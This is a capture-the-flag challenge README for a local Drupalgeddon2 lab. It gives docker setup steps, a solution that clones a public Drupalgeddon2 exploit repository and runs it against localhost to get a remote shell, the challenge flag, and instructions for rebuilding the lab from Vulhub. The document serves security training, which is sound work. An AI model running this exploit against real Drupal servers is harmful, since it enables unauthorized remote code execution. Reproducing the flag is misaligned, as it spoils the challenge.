# Challenge 4: Armageddon

## How to Run
```bash
docker compose pull
docker compose up -d
```

---

## Description
This challenge demonstrates a **Drupalgeddon** attack, which gives the attacker **system-level access** via a remote shell.

---

## Solution
There are multiple ways to exploit this vulnerability, but the recommended approach is to use an **automated exploit script**.

### Steps:
1. Install Ruby.
2. Clone the Drupalgeddon2 exploit repository:
   ```bash
   git clone https://github.com/dreadlocked/Drupalgeddon2.git
   ```
3. Run the exploit against the vulnerable Drupal instance:
   ```bash
   ruby drupalgeddon2.rb http://localhost:8123
   ```
4. Successful exploitation will provide remote shell access.

**Flag:**
```
flag{drupal-rce-works}
```

---

## How to Recreate
1. Clone the Vulhub repository:
   ```bash
   git clone https://github.com/vulhub/vulhub
   ```
2. Navigate to the **Drupalgeddon** folder inside the repository.
3. Build and start the vulnerable container:
   ```bash
   docker compose up -d --build
   ```
4. Once the container is running, hide your flag in any directory of your choice within the system.

---

## Final Notes
This challenge highlights the critical security risk of unpatched CMS installations and demonstrates how **Remote Code Execution (RCE)** vulnerabilities can lead to full system compromise.
